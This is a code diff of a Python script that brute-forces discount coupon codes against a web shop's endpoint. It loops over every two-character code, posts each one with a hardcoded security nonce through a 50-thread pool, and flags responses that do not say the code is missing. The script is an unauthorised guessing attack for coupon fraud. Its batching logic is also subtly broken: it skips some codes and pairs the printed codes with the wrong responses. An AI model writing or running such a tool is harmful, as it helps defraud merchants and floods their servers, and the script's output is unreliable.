@@ -1,4 +1,9 @@
 # importing the requests library
+import itertools
+import sys
+import time
+from multiprocessing.dummy import Pool
+
 import requests
 
 # defining the api-endpoint
@@ -22,39 +27,54 @@ headers = {'accept': 'text/html, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest'
            }
 
-# Imports
-import itertools
-import time
-
 stringType = "1234567890abcdefghijklmnopqrstuvwxyz"
 
-import sys
+sys.stdout = open('promo', 'w')
 
-sys.stdout = open('file', 'w')
+pool = Pool(50)
 
 
-def callAPI(code):
-    # data to be sent to api
-    data = {'security': '37c4e05ef1',
-            'coupon_code': code
-            }
-    # sending post request and saving response as response object
-    r = requests.post(url=API_ENDPOINT, data=data, headers=headers)
-    # extracting response text
-    pastebin_url = r.text
-    if "does not exist" not in pastebin_url:
-        print(code)
+# def callAPI(code):
+#     # data to be sent to api
+#
+#     # sending post request and saving response as response object
+#     r = requests.post(url=API_ENDPOINT, data=data, headers=headers)
+#     # extracting response text
+#     pastebin_url = r.text
+#     print(pastebin_url)
+#     # if "does not exist" not in pastebin_url:
+#     #     print(code)
 
 
 def tryPassword(stringTypeSet):
     start = time.time()
     chars = stringTypeSet
     attempts = 0
-    for i in range(1, 2):
+    count = 0
+    futures = []
+    for i in range(2, 3):
         for letter in itertools.product(chars, repeat=i):
             attempts += 1
             letter = ''.join(letter)
-            callAPI(letter)
+
+            data = {'security': '37c4e05ef1',
+                    'coupon_code': letter
+                    }
+            # callAPI(letter)
+            if count < 50:
+                futures.append(pool.apply_async(requests.post, [API_ENDPOINT], dict(data=data, headers=headers)))
+                count += 1
+            else:
+                for future in futures:
+                    # extracting response text
+                    pastebin_url = future.get().text
+                    print(pastebin_url)
+                    print(letter)
+                    if "does not exist" not in pastebin_url:
+                        print("CHECK THIS!")
+                    # finished and then print the response object.
+                count = 0
+                futures = []
 
 
 tryPassword(stringType)
